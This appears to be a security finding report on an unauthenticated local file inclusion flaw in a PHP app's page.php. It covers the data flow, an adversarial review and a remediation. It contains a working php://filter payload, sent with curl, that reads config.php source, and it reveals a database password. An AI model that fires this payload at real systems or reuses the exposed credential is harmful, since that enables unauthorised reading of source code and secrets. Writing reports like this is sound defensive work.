# Vulnerability: Local File Inclusion / Path Traversal — Unauthenticated dynamic `include` in `page.php`

## Summary
`page.php` builds an include path directly from `$_GET['page']` and appends `.php`
(`:4-6`). Although `allow_url_include=Off` (the `php:7.2-apache` default) blocks `data://`
and `http://`, the `php://filter` wrapper works with `include` regardless, so an
unauthenticated attacker can read the source of any `.php` file — for example `config.php`,
disclosing DB credentials — and traverse to include readable `.php` files. No RCE is claimed,
because `data://`/`php://input` are disabled and the only file-write sink fixes the `.png`
extension (`user/profile.php:13`).

## Confidence
High — found by both taint directions and survived all three adversarial attacks with a
fully cited path.

## Authentication Requirement
Unauthenticated.

## Attack Surface Location
- **Endpoint:** `GET /page.php?page=<payload>`
- **Handler:** `page.php:4-6`
- **Framework protections bypassed:** AumWAF (`libs/AumWAF.class.php:34-45`) does not include
  `php://`, `filter`, or traversal sequences in its signature list.

## Attack Chain
1. **Initial access:** unauthenticated request to `/page.php`.
2. **Endpoint interaction:** supply the `page` query parameter.
3. **Malicious input:** `page=php://filter/convert.base64-encode/resource=/var/www/html/config`.
4. **Sink execution:** `include $page . '.php'` becomes
   `include 'php://filter/convert.base64-encode/resource=/var/www/html/config.php'`
   (`:6`), reading and emitting the file's base64 content.
5. **Post-exploitation:** decode to recover `config.php` source (DB password
   `snf1AvQ74DtF1PJp`); use path traversal to include other readable `.php` files.
6. **Final impact:** sensitive source-code/credential disclosure.

## Data Flow
- **Source (user input):** `$_GET['page']` (`page.php:5`).
- **Sink:** `include` (`page.php:6`).

```
$_GET['page'] → get() [libs/common.php:28] → $page [page.php:5] → include $page . '.php' [page.php:6]
```

## Proof of Concept

### Prerequisites
- None.

### Exploit Request
```bash
curl -s 'http://{{TARGET_HOST}}/page.php?page=php://filter/convert.base64-encode/resource=/var/www/html/config'
```

### Expected Vulnerable Response
Base64 of `config.php`, e.g. beginning:
```
PD9waHAKCiRfQ09ORklHID0gWwogICAgJ2RhdGFiYXNlJyA9PiBbCiAgIC...
```
Decoding yields the source including `'pass' => 'snf1AvQ74DtF1PJp'`.

### Expected Patched Response
The include target is constrained to an allow-list; `php://filter` payloads are rejected and
no source is returned.

### Impact Demonstration
Direct read of `config.php` source provides the database credentials; traversal/include
allows reading any readable `.php` file on the server.

## Affected Code
```php
// page.php:4-6
if(	get('page') ) {
	$page = get('page');
	include $page . '.php';
}
```

## Adversarial Review
Independent reviewer: `security_reviewer_adversary` (did not author this finding).

- **Reachability attack — FAILED to kill.** `page.php:4-6` has no auth and takes raw
  `get('page')` (`libs/common.php:28-30`); the WAF substring list does not match the payload;
  the file sits in the document root (`Dockerfile:7`).
- **Impact attack — FAILED to kill.** Source disclosure of `config.php` (`config.php:3-9` DB
  credentials) is sensitive-data disclosure, in scope.
- **Validity attack — FAILED to kill.** Empirically, with `allow_url_include=Off`,
  `include "php://filter/convert.base64-encode/resource=..."` still returns the file
  (`allow_url_include` gates `http/ftp/data`, not `php://filter`); the appended `.php`
  resolves `resource=.../config` to `config.php`; the base64 stream contains no `<?php`, so
  PHP echoes it. No sanitizer/allow-list exists.

**Verdict: SURVIVED** (all three attacks failed).

## Remediation
Replace the dynamic include with a static allow-list map
(`$allowed = ['core','build-customer-trust','cut-support-cost']; if (!in_array($page, $allowed, true)) { … }`)
and never pass request data to `include`/`require`. Disable unnecessary wrappers and run with
`open_basedir` as defense-in-depth.
